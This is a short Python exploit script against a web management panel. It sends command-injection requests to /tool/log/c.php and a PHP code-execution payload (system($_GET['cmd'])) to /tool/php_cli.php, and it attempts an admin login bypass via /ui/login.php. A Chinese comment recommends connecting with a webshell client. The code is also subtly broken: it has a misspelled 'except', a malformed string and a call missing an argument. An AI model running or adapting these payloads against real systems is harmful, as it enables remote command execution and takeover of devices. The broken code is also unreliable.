import requests

def one(ip,comm):
	try:
		url=ip+"/tool/log/c.php?strip_slashes=system&host="+comm
		r=requests.get(url)
		if r:
			print(r.text)
	except:
		pass

def two(ip):
	try:
		# 这个大家懂就行，直接上菜刀连接
		url=ip+"/tool/php_cli.php?code=system($_GET["cmd"]);
		r=requests.get(url)
	exceept:
		pass

def three(ip):
	try:
		url=ip+"/ui/login.php?user=admin";
		r=requests.get(url)
	except:
		pass

if __name__=="__main__":
	ip=""
	one(ip)
	